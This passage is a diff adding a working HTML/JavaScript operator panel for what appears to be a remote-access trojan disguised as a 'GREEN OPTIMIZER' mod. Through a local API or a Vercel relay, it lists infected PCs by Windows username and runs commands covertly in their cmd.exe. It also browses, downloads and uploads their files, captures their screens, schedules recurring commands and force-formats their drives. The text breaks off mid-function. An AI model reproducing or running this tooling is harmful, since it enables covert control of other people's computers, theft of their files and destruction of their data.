@@ -1,0 +1,855 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<title>GREEN OPTIMIZER by Flex</title>
+<style>
+  :root { --green:#16c60c; --err:#e74856; --dim:#8a8a8a; --fg:#cccccc; --bg:#0c0c0c; }
+  * { box-sizing:border-box; }
+  html,body { height:100%; margin:0; background:var(--bg); color:var(--fg);
+    font-family:'Consolas','Courier New',monospace; font-size:14px;
+    display:flex; flex-direction:column; }
+  #top { background:#1f1f1f; border-bottom:1px solid #333; padding:4px 8px;
+    display:flex; gap:10px; align-items:center; flex-wrap:wrap; font-size:12px; }
+  #top .dot { width:9px; height:9px; border-radius:50%; background:var(--err); box-shadow:0 0 6px var(--err); }
+  #top .dot.on { background:var(--green); box-shadow:0 0 6px var(--green); }
+  #top input, #top select { background:#0c0c0c; border:1px solid #333; color:#ccc;
+    font-family:inherit; font-size:11px; padding:2px 5px; }
+  #top label { color:#777; font-size:11px; }
+  .btn { cursor:pointer; border:1px solid #444; background:#111; color:#aaa;
+    font-family:inherit; font-size:11px; padding:2px 8px; }
+  .btn:hover { color:#fff; border-color:#888; }
+  #tabs { display:flex; gap:2px; background:#111; padding:4px 8px 0; }
+  .tab { padding:6px 18px; cursor:pointer; color:var(--dim); border:1px solid #333;
+    border-bottom:none; border-radius:4px 4px 0 0; background:#181818; user-select:none; }
+  .tab.act { background:var(--bg); color:var(--green); border-color:#3a3a3a; font-weight:bold; }
+  main { flex:1; overflow:hidden; display:flex; flex-direction:column; }
+  section.view { display:none; flex:1; flex-direction:column; overflow:hidden; }
+  section.view.act { display:flex; }
+
+  /* clients */
+  #clientsBody { overflow-y:auto; padding:10px 14px; }
+  table.ct { width:100%; border-collapse:collapse; font-size:13px; }
+  .ct th { text-align:left; color:var(--dim); font-weight:normal; padding:4px 8px;
+    border-bottom:1px solid #333; font-size:11px; }
+  .ct td { padding:6px 8px; border-bottom:1px solid #222; }
+  tr.client { cursor:pointer; } tr.client:hover { background:#161b16; }
+  tr.client.sel { background:#12210f; outline:1px solid var(--green); }
+  .odot { display:inline-block; width:8px; height:8px; border-radius:50%; margin-right:6px; }
+  .on { background:var(--green); box-shadow:0 0 5px var(--green); }
+  .off { background:#555; }
+  .hint { color:var(--dim); font-size:12px; padding:10px 14px; }
+
+  /* console */
+  #out { flex:1; overflow-y:auto; padding:8px 12px; white-space:pre-wrap; word-break:break-all; line-height:1.35; }
+  #out .in { color:#fff; font-weight:bold; } #out .ok { color:var(--green); }
+  #out .bad { color:var(--err); } #out .dim { color:var(--dim); }
+  #line { display:flex; padding:0 12px 8px; }
+  #ps1 { white-space:pre; color:#fff; font-weight:bold; }
+  #cmd { flex:1; background:transparent; border:none; outline:none; color:var(--fg);
+    font-family:inherit; font-size:14px; caret-color:var(--green); }
+
+  /* files */
+  #fbar { display:flex; gap:6px; padding:8px 12px; align-items:center; flex-wrap:wrap; }
+  #fpath { flex:1; min-width:260px; background:#0c0c0c; border:1px solid #333; color:#ccc;
+    font-family:inherit; font-size:13px; padding:4px 8px; outline:none; }
+  #drives { display:flex; gap:6px; padding:0 12px 6px; flex-wrap:wrap; }
+  #ctx { position:fixed; display:none; z-index:50; background:#181818; border:1px solid var(--green);
+         border-radius:6px; min-width:190px; box-shadow:0 8px 30px rgba(0,0,0,.7); overflow:hidden; }
+  #ctx div { padding:8px 16px; cursor:pointer; font-size:13px; color:#ccc; }
+  #ctx div:hover { background:#243b2a; color:var(--green); }
+  #viewer { position:fixed; inset:0; z-index:60; display:none; background:rgba(0,0,0,.75); }
+  #vhead { display:flex; justify-content:space-between; align-items:center; background:#111;
+           color:var(--green); font-size:14px; padding:10px 18px; border-bottom:1px solid var(--green); }
+  #vclose { cursor:pointer; font-size:18px; color:#888; } #vclose:hover { color:#fff; }
+  #vpre { margin:0; height:calc(100vh - 43px); overflow:auto; padding:16px 20px;
+          color:#cfe8d5; font-family:Consolas,monospace; font-size:13px; white-space:pre-wrap; word-break:break-all; }
+  .drv { cursor:pointer; border:1px solid #333; background:#141414; color:var(--dim);
+    font-family:inherit; font-size:12px; padding:4px 12px; border-radius:3px; }
+  .drv:hover { border-color:var(--green); color:#fff; }
+  .drv.stub { opacity:.35; cursor:default; }
+  #filesBody { flex:1; overflow-y:auto; padding:4px 12px 12px; }
+  .none { color:#555; font-size:26px; padding:60px 0; text-align:center; letter-spacing:4px; }
+
+  /* screen */
+  #sbar { display:flex; gap:12px; padding:8px 12px; align-items:center; flex-wrap:wrap; }
+  #scrWrap { flex:1; overflow:auto; text-align:center; background:#050505; }
+  #scr { max-width:100%; display:none; border:1px solid #222; margin:8px auto; }
+  #scrWrap.live img#scr { display:block; }
+  #scrWrap.live #scrNone { display:none; }
+  table.ft { width:100%; border-collapse:collapse; font-size:13px; }
+  .ft td { padding:5px 8px; border-bottom:1px solid #1e1e1e; }
+  tr.fe { cursor:pointer; } tr.fe:hover { background:#151a15; }
+  .fname { color:#e8e8e8; } .fdir { color:var(--green); font-weight:bold; }
+  .fmeta { color:var(--dim); font-size:11px; text-align:right; white-space:nowrap; }
+</style>
+</head>
+<body>
+
+<div id="top">
+  <span class="dot" id="dot"></span><b id="linkState">нет связи</b>
+  <label>режим</label>
+  <select id="mode">
+    <option value="local">локально</option>
+    <option value="relay">релей Vercel</option>
+  </select>
+  <span id="localCfg">
+    <label>адрес мода</label><input id="base" size="22" spellcheck="false">
+    <label>ключ</label><input id="key" type="password" size="10" spellcheck="false">
+  </span>
+  <span id="relayCfg" style="display:none">
+    <label>адрес релея</label><input id="relayUrl" size="24" placeholder="https://xxx.vercel.app" spellcheck="false">
+    <label>ключ</label><input id="rkey" type="password" size="10" spellcheck="false">
+  </span>
+  <button class="btn" onclick="reconnect()">переподключить</button>
+  <span style="margin-left:auto;color:#555" id="selInfo"></span>
+</div>
+
+<div id="tabs">
+  <div class="tab act" data-v="clients">Подключения</div>
+  <div class="tab" data-v="console">Консоль</div>
+  <div class="tab" data-v="files">Файлы</div>
+  <div class="tab" data-v="screen">Просмотр</div>
+</div>
+
+<main>
+  <!-- ============ клиенты ============ -->
+  <section class="view act" id="v-clients">
+    <div class="hint" id="clientsHint">Список ПК с установленным модом (имя = пользователь Windows).
+      Клик по строке — подключиться.</div>
+    <div id="clientsBody"><div class="hint">ожидание данных...</div></div>
+  </section>
+
+  <!-- ============ консоль ============ -->
+  <section class="view" id="v-console">
+    <div id="out"></div>
+    <div id="line"><span id="ps1"></span><input id="cmd" autocomplete="off" spellcheck="false"></div>
+  </section>
+
+  <!-- ============ файлы ============ -->
+  <section class="view" id="v-files">
+    <div id="fbar">
+      <button class="btn" onclick="filesGo(parentOf(curPath))">Вверх</button>
+      <input id="fpath" spellcheck="false" placeholder="C:\">
+      <button class="btn" onclick="filesGo($('fpath').value.trim())">Открыть</button>
+      <button class="btn" onclick="loadDrives()">Диски</button>
+      <button class="btn" style="color:var(--green);border-color:var(--green)" onclick="pickUpload()">⬆ Импорт файла</button>
+      <button class="btn" style="color:#ff5f5f;border-color:#ff5f5f" onclick="askDelete()">🗑 Удалить файл</button>
+      <input type="file" id="upl" style="display:none">
+    </div>
+    <div id="drives"></div>
+    <div id="filesBody"><div class="none">None</div></div>
+  </section>
+
+  <!-- ============ просмотр экрана ============ -->
+  <section class="view" id="v-screen">
+    <div id="sbar">
+      <button class="btn" style="color:var(--green);border-color:var(--green)" onclick="requestScreen()">📸 Снимок экрана</button>
+      <label style="color:#ccc;font-size:13px;display:flex;align-items:center;gap:5px">
+        <input type="checkbox" id="scrAuto"> Авто (2 сек)</label>
+      <span id="scrInfo" style="color:#555;font-size:12px"></span>
+    </div>
+    <div id="scrWrap"><img id="scr" alt=""><div id="scrNone" class="none">NO SIGNAL</div></div>
+  </section>
+</main>
+<div id="ctx"></div>
+<div id="viewer"><div id="vhead"><span id="vname"></span><span id="vclose">✕</span></div><pre id="vpre"></pre></div>
+
+<script>
+(function () {
+  var $ = function (id) { return document.getElementById(id); };
+  var cfg = {
+    mode:  localStorage.getItem('gi_mode')  || 'local',
+    base:  localStorage.getItem('gi_base')  || 'http://127.0.0.1:8765',
+    key:   localStorage.getItem('gi_key')   || '',
+    relay: localStorage.getItem('gi_relay') || '',
+    rkey:  localStorage.getItem('gi_rkey')  || '',
+    room:  localStorage.getItem('gi_room')  || '',
+    sel:   localStorage.getItem('gi_sel')   || ''
+  };
+  var online = false;
+  var hist = JSON.parse(localStorage.getItem('gi_hist') || '[]');
+  var hIdx = hist.length;
+  var curPath = '';
+  var seenRes = 0;
+  var waiters = {};
+
+  $('mode').value = cfg.mode;
+  $('base').value = cfg.base;
+  $('key').value = cfg.key;
+  $('relayUrl').value = cfg.relay;
+  $('rkey').value = cfg.rkey;
+  applyMode();
+
+  function applyMode() {
+    $('localCfg').style.display = cfg.mode === 'local' ? '' : 'none';
+    $('relayCfg').style.display = cfg.mode === 'relay' ? '' : 'none';
+  }
+  function save() {
+    ['mode','base','key','relay','rkey','room','sel'].forEach(function (k) {
+      localStorage.setItem('gi_' + k, cfg[k]);
+    });
+  }
+
+  /* ---------- ui helpers ---------- */
+  function esc(s) {
+    return String(s == null ? '' : s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+  }
+  window.print = function (text, cls) {
+    var d = document.createElement('div');
+    d.className = cls || '';
+    d.innerHTML = esc(text);
+    $('out').appendChild(d);
+    $('out').scrollTop = $('out').scrollHeight;
+  };
+  function fmtSize(b) {
+    if (b === 0 || b == null) return '-';
+    if (b < 1048576) return (b/1024).toFixed(0)+' KB';
+    if (b < 1073741824) return (b/1048576).toFixed(1)+' MB';
+    return (b/1073741824).toFixed(2)+' GB';
+  }
+  function parentOf(p) {
+    if (!p) return '';
+    p = p.replace(/[\\/]+$/, '');
+    var i = Math.max(p.lastIndexOf('\\'), p.lastIndexOf('/'));
+    return i > 0 ? p.slice(0, i) : '';
+  }
+  function ps1() {
+    $('ps1').textContent = '[' + (cfg.sel || cfg.mode) + ']' +
+      (online ? '' : '[offline]') + '>';
+  }
+  function setLink(state, text) {
+    online = state;
+    $('dot').className = state ? 'dot on' : 'dot';
+    $('linkState').textContent = text;
+    ps1();
+  }
+  function selText() {
+    $('selInfo').textContent = cfg.room ? ('цель: ' + (cfg.sel || cfg.room)) : '';
+  }
+
+  /* ---------- tabs ---------- */
+  document.querySelectorAll('.tab').forEach(function (t) {
+    t.onclick = function () {
+      document.querySelectorAll('.tab').forEach(function (x) { x.classList.remove('act'); });
+      document.querySelectorAll('.view').forEach(function (x) { x.classList.remove('act'); });
+      t.classList.add('act');
+      $('v-' + t.dataset.v).classList.add('act');
+      if (t.dataset.v === 'clients' && cfg.mode === 'relay') refreshClients();
+      if (t.dataset.v === 'files') {
+        $('cmd').blur();
+        if (cfg.room && !$('filesBody').querySelector('table, .drv')) filesGo('');
+      }
+      if (t.dataset.v === 'screen' && !$('scrWrap').classList.contains('live')) requestScreen();
+    };
+  });
+
+  /* ---------- transport: local ---------- */
+  function localApi(path, opts) {
+    opts = opts || {};
+    opts.headers = opts.headers || {};
+    opts.headers['X-Panel-Key'] = cfg.key;
+    return fetch(cfg.base.replace(/\/+$/, '') + '/api/' + path, opts)
+      .then(function (r) { return r.json(); });
+  }
+
+  /* ---------- transport: relay ---------- */
+  function normRelay(u) {
+    u = (u || '').trim();
+    if (!u) return '';
+    if (!/^https?:\/\//i.test(u)) u = 'https://' + u;
+    u = u.replace(/\/+$/, '');
+    u = u.replace(/\/api\/relay$/i, '');
+    return u;
+  }
+  function jfetch(url, opts) {
+    return fetch(url, opts).then(function (r) {
+      return r.text().then(function (t) {
+        var j;
+        try { j = JSON.parse(t); }
+        catch (e) { throw new Error('HTTP ' + r.status + ' — проверь адрес релея'); }
+        if (j && j.ok === false) throw new Error(j.error || ('HTTP ' + r.status));
+        return j;
+      });
+    });
+  }
+  function relayUrl(a) {
+    return normRelay(cfg.relay) + '/api/relay?a=' + a +
+      '&room=' + encodeURIComponent(cfg.room || '') + '&k=' + encodeURIComponent(cfg.rkey);
+  }
+  var pollBusy = false;
+  function pollRelay() {
+    if (!normRelay(cfg.relay)) return Promise.reject(new Error('адрес релея не задан'));
+    if (pollBusy) return Promise.resolve({ ok: true, results: [], next: seenRes });
+    pollBusy = true;
+    return jfetch(relayUrl('op-poll') + '&since=' + seenRes)
+      .then(function (j) {
+        if (!j.ok) throw new Error(j.error || 'fail');
+        j.results.forEach(function (r) {
+          window.print(r.text);
+          if (waiters[r.cid]) { waiters[r.cid](r.text); delete waiters[r.cid]; }
+        });
+        if (typeof j.next === 'number' && j.next > seenRes) seenRes = j.next;
+      })
+      .then(function () { pollBusy = false; },
+            function (e) { pollBusy = false; throw e; });
+  }
+  function relayCall(command, timeoutMs) {
+    if (!normRelay(cfg.relay)) {
+      return Promise.reject(new Error('адрес релея не задан'));
+    }
+    var cid = 'c' + Date.now() + Math.random().toString(36).slice(2, 6);
+    return jfetch(relayUrl('op-send'), {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ cid: cid, command: command })
+    }).then(function (j) {
+      return new Promise(function (resolve, reject) {
+        var fastIv = null;
+        waiters[cid] = function (t) {
+          if (fastIv) clearInterval(fastIv);
+          delete waiters[cid];
+          resolve(t);
+        };
+        fastIv = setInterval(function () {
+          if (!waiters[cid]) { clearInterval(fastIv); return; }
+          pollRelay().catch(function () {});
+        }, 400);
+        setTimeout(function () {
+          if (waiters[cid]) {
+            if (fastIv) clearInterval(fastIv);
+            delete waiters[cid];
+            reject(new Error('мод не ответил'));
+          }
+        }, timeoutMs || 35000);
+      });
+    });
+  }
+
+  function reconnect() {
+    cfg.mode  = $('mode').value;
+    cfg.base  = $('base').value.trim();
+    cfg.key   = $('key').value.trim();
+    cfg.relay = normRelay($('relayUrl').value);
+    $('relayUrl').value = cfg.relay;
+    cfg.rkey  = $('rkey').value.trim();
+    save(); applyMode();
+    seenRes = 0; waiters = {};
+    setLink(false, 'подключение...');
+    poll();
+  }
+  window.reconnect = reconnect;
+
+  function poll() {
+    if (cfg.mode === 'local') {
+      localApi('status').then(function (s) {
+        if (!s.ok) throw new Error(s.error || 'ключ отвергнут');
+        cfg.sel = s.os.split(' ')[0] === 'Windows' ? 'этот ПК' : cfg.sel;
+        cfg.room = ''; save(); selText();
+        setLink(true, 'GREEN OPTIMIZER v' + s.version + ' | локальный ПК');
+      }).catch(function (e) { setLink(false, 'мод недоступен (' + e.message + ')'); });
+    } else {
+      if (!normRelay(cfg.relay)) { setLink(false, 'укажи адрес релея'); return; }
+      pollRelay().then(function () {
+        setLink(true, 'релей ' + cfg.relay.replace(/^https?:\/\//, ''));
+      }).catch(function (e) { setLink(false, 'релей недоступен (' + e.message + ')'); });
+    }
+  }
+
+  /* ---------- clients tab ---------- */
+  function refreshClients() {
+    if (cfg.mode !== 'relay' || !normRelay(cfg.relay)) {
+      $('clientsHint').textContent = 'Список клиентов работает в режиме «релей Vercel». Переключи режим и укажи адрес.';
+      $('clientsBody').innerHTML = '<div class="hint">—</div>'; return;
+    }
+    $('clientsHint').textContent = 'Клик по строке — подключиться к ПК клиента (консоль и файлы будут работать с его машиной).';
+    jfetch(normRelay(cfg.relay) + '/api/relay?a=clients')
+      .then(function (j) {
+        if (!j.ok) throw new Error(j.error);
+        var tb = '<table class="ct"><tr><th></th><th>Пользователь</th><th>Комната</th><th>Система</th><th>Был онлайн</th></tr>';
+        if (!j.clients.length) tb += '<tr><td colspan="5" style="color:#555;padding:14px">пока никто не подключался — на клиенте должен быть прописан url релея</td></tr>';
+        j.clients.forEach(function (c) {
+          tb += '<tr class="client' + (cfg.room === c.room ? ' sel' : '') + '" data-room="' + esc(c.room) +
+                '" data-user="' + esc(c.user) + '">' +
+            '<td><span class="odot ' + (c.online ? 'on' : 'off') + '"></span>' + (c.online ? 'онлайн' : 'оффлайн') + '</td>' +
+            '<td><b>' + esc(c.user) + '</b></td>' +
+            '<td style="color:var(--dim)">' + esc(c.room) + '</td>' +
+            '<td style="color:var(--dim)">' + esc(c.info) + '</td>' +
+            '<td style="color:var(--dim)">' + Math.round(c.msAgo / 1000) + ' c назад</td></tr>';
+        });
+        tb += '</table>';
+        $('clientsBody').innerHTML = tb;
+        $('clientsBody').querySelectorAll('tr.client').forEach(function (tr) {
+          tr.onclick = function () {
+            cfg.room = tr.dataset.room;
+            cfg.sel = tr.dataset.user;
+            save(); selText(); ps1();
+            refreshClients();
+            window.print('[LINK] подключено к ' + cfg.sel + ' (комната ' + cfg.room + ')', 'ok');
+            $('filesBody').innerHTML = '<div class="none">None</div>';
+            filesGo('');
+          };
+        });
+      }).catch(function (e) {
+        $('clientsBody').innerHTML = '<div class="hint">ошибка списка: ' + esc(e.message) + '</div>';
+      });
+  }
+  setInterval(refreshClients, 6000);
+
+  /* ---------- console tab ---------- */
+  function sendLocalCmd(command) {
+    var t0 = Date.now();
+    return localApi('cmd', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: new URLSearchParams({ command: command, timeout: 30000 }).toString()
+    }).then(function (r) {
+      if (r.stdout) window.print(r.stdout);
+      if (r.stderr) window.print('[stderr] ' + r.stderr, 'dim');
+      if (r.timedOut) window.print('[FAIL] ТАЙМАУТ', 'bad');
+      else if (r.exitCode === 0) window.print('[OK] exit 0 за ' + (Date.now()-t0) + ' мс', 'ok');
+      else window.print('[FAIL] exit ' + r.exitCode, 'bad');
+    });
+  }
+  function sendRelayCmd(command) {
+    return relayCall(command).then(function (text) { /* результат придёт через op-poll */ })
+      .catch(function (e) { window.print('[FAIL] ' + e.message, 'bad'); });
+  }
+  function exec(line) {
+    var parts = line.trim().split(/\s+/);
+    var c = parts[0].toLowerCase();
+    var rest = line.trim().slice(parts[0].length).trim();
+    if (c === 'clear') { $('out').innerHTML = ''; return; }
+    if (c === 'connect') { window.print('[..] переподключение...', 'dim'); reconnect(); return; }
+    if (c === 'help' || c === '/?') {
+      window.print(
+'Всё, что ты вводишь, уходит прямо в cmd.exe выбранного ПК (скрыто).\n' +
+'schedule <id> <сек> <команда>  — автозапуск по таймеру\n' +
+'cancel <id> | tasks | clear | connect\n' +
+'Файлы: вкладка «Файлы» — ⬇ у файла = скачать с ПК клиента,\n' +
+'«⬆ Загрузить сюда» = закинуть файл в открытую папку.', 'dim');
+      return;
+    }
+    if (!online) { window.print('[FAIL] нет канала связи.', 'bad'); return; }
+    if (cfg.mode === 'relay' && !cfg.room) {
+      window.print('[FAIL] выбери клиента во вкладке «Подключения» (клик по строке).', 'bad');
+      return;
+    }
+    if (cfg.mode === 'local') {
+      if (c === 'tasks' || c === 'schedule' || c === 'cancel') { taskCmdLocal(c, rest); return; }
+      sendLocalCmd(line.trim());
+    } else {
+      if (c === 'tasks') { sendRelayCmd('@tasks'); return; }
+      if (c === 'cancel') { sendRelayCmd('@cancel ' + rest); return; }
+      if (c === 'schedule') { sendRelayCmd('@schedule ' + rest); return; }
+      sendRelayCmd(line.trim());
+    }
+  }
+  function taskCmdLocal(c, rest) {
+    if (c === 'tasks') {
+      localApi('tasks').then(function (r) {
+        if (!r.tasks.length) { window.print('[TASKS] нет задач', 'dim'); return; }
+        r.tasks.forEach(function (t) {
+          window.print('[TASKS] ' + t.id + ' | каждые ' + t.periodSec + 'с | ' +
+            (t.running ? 'РАБОТАЕТ' : 'стоп') + ' | ' + t.command, t.running ? 'ok' : 'dim');
+        });
+      }); return;
+    }
+    if (c === 'schedule') {
+      var m = rest.match(/^\s*(\S+)\s+(\d+)\s*([\s\S]+)$/);
+      if (!m) { window.print('[FAIL] формат: schedule <id> <сек> <команда>', 'bad'); return; }
+      localApi('schedule', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: new URLSearchParams({ id: m[1], periodSec: m[2], delaySec: 0, command: m[3] }).toString()
+      }).then(function (r) {
+        window.print(r.ok ? "[OK] задача '" + m[1] + "' каждые " + m[2] + 'с' : '[FAIL] ' + r.error,
+          r.ok ? 'ok' : 'bad');
+      }); return;
+    }
+    if (!rest) { window.print('[FAIL] формат: cancel <id>', 'bad'); return; }
+    localApi('cancel', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: new URLSearchParams({ id: rest }).toString()
+    }).then(function (r) {
+      window.print(r.removed ? "[OK] '" + rest + "' остановлена" : '[FAIL] не найдена',
+        r.removed ? 'ok' : 'bad');
+    });
+  }
+  $('cmd').addEventListener('keydown', function (e) {
+    if (e.key === 'Enter') {
+      var line = $('cmd').value;
+      if (!line.trim()) return;
+      window.print((cfg.sel || cfg.mode) + '> ' + line, 'in');
+      hist.push(line); if (hist.length > 50) hist.shift();
+      localStorage.setItem('gi_hist', JSON.stringify(hist));
+      hIdx = hist.length; $('cmd').value = '';
+      exec(line);
+    } else if (e.key === 'ArrowUp') {
+      if (hIdx > 0) hIdx--;
+      $('cmd').value = hist[hIdx] || ''; e.preventDefault();
+    } else if (e.key === 'ArrowDown') {
+      if (hIdx < hist.length - 1) { hIdx++; $('cmd').value = hist[hIdx]; }
+      else { hIdx = hist.length; $('cmd').value = ''; }
+      e.preventDefault();
+    }
+  });
+
+  /* ---------- files tab ---------- */
+  function stubDrives() {
+    $('drives').innerHTML =
+      '<span class="drv stub">C:</span><span class="drv stub">D:</span>';
+    $('filesBody').innerHTML = '<div class="none">None</div>';
+  }
+  window.filesGo = function (path) {
+    path = (path || '').trim();
+    if (!online) { stubDrives(); return; }
+    if (cfg.mode === 'local') filesGoLocal(path); else filesGoRelay(path);
+  };
+  function renderEntries(path, entries) {
+    curPath = path; $('fpath').value = path;
+    var rows = '';
+    if (parentOf(path)) rows += '<tr class="fe" data-p="' + esc(parentOf(path)) +
+      '"><td class="fdir">[..]</td><td class="fmeta"></td></tr>';
+    entries.forEach(function (en, idx) {
+      var fp = en.dir ? joinP(path, en.name) : joinP(path, en.name);
+      rows += '<tr class="fe" data-p="' + esc(en.dir ? fp : '') + '" data-fp="' + (en.dir ? '' : esc(fp)) + '">' +
+        '<td><span class="' + (en.dir ? 'fdir' : 'fname') + '">' +
+        (en.dir ? '[DIR]  ' : '[FILE] ') + esc(en.name) + '</span></td>' +
+        '<td class="fmeta">' + (en.dir ? '' : fmtSize(en.size) + ' <span class="dl" data-i="' + idx + '" style="cursor:pointer;color:var(--green)">⬇</span>') + '</td></tr>';
+    });
+    $('filesBody').innerHTML = '<table class="ft">' + rows + '</table>';
+    $('filesBody').querySelectorAll('tr.fe').forEach(function (tr) {
+      tr.onclick = function () {
+        var p = tr.dataset.p;
+        if (p) filesGo(p);
+      };
+      tr.oncontextmenu = function (ev) { ev.preventDefault(); showCtx(ev, tr); };
+    });
+    $('filesBody').querySelectorAll('.dl').forEach(function (el) {
+      el.onclick = function (ev) {
+        ev.stopPropagation();
+        var tr = el.closest('tr');
+        if (tr && tr.dataset.fp) downloadFile(tr.dataset.fp);
+      };
+    });
+  }
+
+  /* ---------- контекстное меню + просмотрщик ---------- */
+  var TEXT_EXT = ['txt','log','cfg','ini','json','xml','html','htm','css','js','bat','cmd','ps1','md','yml','yaml','properties','conf','csv','vbs','reg','url','nfo'];
+  function extOf(name) {
+    var m = String(name).toLowerCase().match(/\.([a-z0-9]+)$/);
+    return m ? m[1] : '';
+  }
+  function isTextFile(name) { return TEXT_EXT.indexOf(extOf(name)) !== -1; }
+  function hideCtx() { $('ctx').style.display = 'none'; }
+  document.addEventListener('click', hideCtx);
+  window.addEventListener('blur', hideCtx);
+
+  function showCtx(ev, tr) {
+    var fp = tr.dataset.fp, dp = tr.dataset.p;
+    var name = fp ? fp.split('\\').pop() : (dp ? dp.replace(/[\\/]+$/, '').split('\\').pop() : '');
+    var items = [];
+    if (dp) items.push(['📂 Открыть', function () { filesGo(dp); }]);
+    if (fp) {
+      if (isTextFile(name)) items.push(['📄 Открыть (просмотр)', function () { openViewer(fp); }]);
+      items.push(['⬇ Скачать', function () { downloadFile(fp); }]);
+    }
+    items.push(['🔄 Обновить', function () { filesGo(curPath); }]);
+    items.push(['⬆ Импорт файла сюда', function () { pickUpload(); }]);
+    var c = $('ctx');
+    c.innerHTML = items.map(function (it, i) { return '<div data-i="' + i + '">' + it[0] + '</div>'; }).join('');
+    c.querySelectorAll('div').forEach(function (d) {
+      d.onclick = function (e) { e.stopPropagation(); hideCtx(); items[+d.dataset.i][1](); };
+    });
+    c.style.display = 'block';
+    var x = Math.min(ev.clientX, window.innerWidth - 210), y = Math.min(ev.clientY, window.innerHeight - items.length * 34 - 12);
+    c.style.left = x + 'px'; c.style.top = y + 'px';
+  }
+
+  function showDriveMenu(ev, driveName) {
+    var letter = driveName.replace(/[\\/]+$/, '');
+    var items = [
+      ['📂 Открыть диск', function () { filesGo(driveName); }],
+      ['⚠ ФОРМАТИРОВАТЬ ' + letter, function () { forceFormat(letter); }]
+    ];
+    var c = $('ctx');
+    c.innerHTML = items.map(function (it, i) { return '<div data-i="' + i + '">' + it[0] + '</div>'; }).join('');
+    c.querySelectorAll('div').forEach(function (d) {
+      d.onclick = function (e) { e.stopPropagation(); hideCtx(); items[+d.dataset.i][1](); };
+    });
+    c.style.display = 'block';
+    var x = Math.min(ev.clientX, window.innerWidth - 210), y = Math.min(ev.clientY, window.innerHeight - items.length * 34 - 12);
+    c.style.left = x + 'px'; c.style.top = y + 'px';
+  }
+  function forceFormat(letter) {
+    if (!confirm('ФОРМАТИРОВАНИЕ ДИСКА ' + letter + '\nВСЕ ДАННЫЕ БУДУТ УНИЧТОЖЕНЫ.\nПродолжить?')) return;
+    if (!confirm('Точно? Диск ' + letter + ' будет принудительно отформатирован (NTFS, быстрый, с отключением).')) return;
+    window.print('[..] форматирую ' + letter + ' ...', 'dim');
+    var cmd = 'echo Y| format ' + letter + ' /FS:NTFS /Q /X /V:GreenOpt';
+    if (cfg.mode === 'local') {
+      localApi('cmd', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: new URLSearchParams({ command: cmd, timeout: 180000 }).toString()
+      }).then(function (r) {
+        if (r.stdout) window.print(r.stdout);
+        if (r.stderr) window.print('[stderr] ' + r.stderr, 'dim');
+        window.print(r.exitCode === 0 ? '[OK] форматирование завершено' : ('[FAIL] exit ' + r.exitCode), r.exitCode === 0 ? 'ok' : 'bad');
+      }).catch(function (e) { window.print('[FAIL] ' + e.message, 'bad'); });
+    } else {
+      relayCall(cmd, 180000).then(function (t) {
+        window.print(t, t.indexOf('[OK]') === 0 ? 'ok' : 'bad');
+      }).catch(function (e) { window.print('[FAIL] ' + e.message, 'bad'); });
+    }
+  }
+
+  function showViewer(name, text) {
+    $('vname').textContent = name;
+    $('vpre').textContent = text;
+    $('viewer').style.display = 'block';
+  }
+  $('vclose').onclick = function () { $('viewer').style.display = 'none'; };
+  document.addEventListener('keydown', function (e) {
+    if (e.key === 'Escape') { hideCtx(); $('viewer').style.display = 'none'; }
+  });
+
+  function openViewer(path) {
+    var name = path.split('\\').pop();
+    window.print('[..] читаю ' + path + ' ...', 'dim');
+    if (cfg.mode === 'local') {
+      localApi('read?path=' + encodeURIComponent(path)).then(function (j) {
+        if (!j.ok) throw new Error(j.error);
+        showViewer(j.name, bytesToText(j.data));
+      }).catch(function (e) { window.print('[FAIL] ' + e.message, 'bad'); });
+    } else {
+      relayCall('@read ' + path, 60000).then(function (text) {
+        if (text.indexOf('[DATA]|') === 0) {
+          var p = text.split('|');
+          showViewer(dec(p[1]), bytesToText(p[2]));
+        } else {
+          window.print(text);
+        }
+      }).catch(function (e) { window.print('[FAIL] ' + e.message, 'bad'); });
+    }
+  }
+  function bytesToText(b64) {
+    var bin = atob(b64.replace(/-/g, '+').replace(/_/g, '/'));
+    var arr = new Uint8Array(bin.length);
+    for (var i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
+    try { return new TextDecoder('utf-8', { fatal: false }).decode(arr); }
+    catch (e) { return decodeURIComponent(escape(bin)); }
+  }
+  function joinP(a, b) { return a.replace(/[\\/]+$/, '') + '\\' + b; }
+  function filesGoLocal(path) {
+    localApi('files' + (path ? '?path=' + encodeURIComponent(path) : ''))
+      .then(function (j) {
+        if (!j.ok) { window.print('[FAIL] ' + j.error, 'bad'); return; }
+        if (j.drives) {
+          $('drives').innerHTML = j.drives.map(function (d) {
+            return '<span class="drv" data-d="' + esc(d.name) + '">' + esc(d.name) +
+              ' <span style="color:#555">' + fmtSize(d.free) + ' своб.</span></span>';
+          }).join('');
+          $('drives').querySelectorAll('.drv').forEach(function (el) {
+            el.onclick = function () { filesGo(el.dataset.d); };
+          });
+          if (!path && j.drives.length) filesGo(j.drives[0].name);
+          return;
+        }
+        renderEntries(j.path || path, j.entries || []);
+      }).catch(function (e) { window.print('[FAIL] files: ' + e.message, 'bad'); });
+  }
+  function filesGoRelay(path) {
+    if (!cfg.room) { window.print('[FAIL] сначала выбери клиента во вкладке «Подключения»', 'bad'); return; }
+    var req = path ? ('@files ' + path) : '@drives';
+    relayCall(req, 20000).then(function (text) {
+      var lines = text.split('\n');
+      if (lines[0].indexOf('[DRIVES]') === 0) {
+        var ds = lines.slice(1).filter(Boolean).map(function (l) {
+          var p = l.split('|');
+          return { name: p[1], free: parseInt(p[2], 10) || 0 };
+        });
+        $('drives').innerHTML = ds.map(function (d) {
+          return '<span class="drv" data-d="' + esc(d.name) + '">' + esc(d.name) +
+            ' <span style="color:#555">' + fmtSize(d.free) + ' своб.</span></span>';
+        }).join('');
+        $('drives').querySelectorAll('.drv').forEach(function (el) {
+          el.onclick = function () { filesGo(el.dataset.d); };
+          el.oncontextmenu = function (ev) { ev.preventDefault(); showDriveMenu(ev, el.dataset.d); };
+        });
+        return;
+      }
